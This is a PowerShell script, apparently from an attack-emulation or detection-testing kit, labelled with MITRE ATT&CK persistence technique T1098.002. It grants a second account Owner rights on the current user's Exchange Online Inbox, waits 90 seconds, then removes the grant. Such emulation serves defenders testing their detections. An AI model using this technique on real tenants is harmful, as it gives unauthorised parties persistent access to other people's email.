<#
.SYNOPSIS
Connect to Exchange Online REST API and grant Owner access to the inbox folder of the current user's mailbox

.DESCRIPTION
TA0003: Persistence
T1098.002: Additional Email Delegate Permissions
3rd attack method
#>

Get-Module | Where-Object name -eq connect-exo | Remove-Module -Verbose
Import-Module ../APIs/connect-EXO.psm1
Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1

# We use the ews environment variables
Import-Environment "exops.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "https://outlook.office.com/Exchange.Manage"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:EXOPS_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:EXOPS_DELEGATE_REDIRECT_URI }

Connect-ExchangeOnline -accessToken $accessToken -Organization $env:TENANT_ID

$account2 = Read-Host -Prompt "Account 2 (grant access to)"

Add-MailboxFolderPermission -Identity ":\Inbox" -User $account2 -AccessRights Owner
Write-Host "Done, now waiting 90 seconds for propagation and then reversing..."
Wait-KeyOrTimeOut -Timeout 90000
Remove-MailboxFolderPermission -Identity ":\Inbox" -User $account2 -Confirm:$False
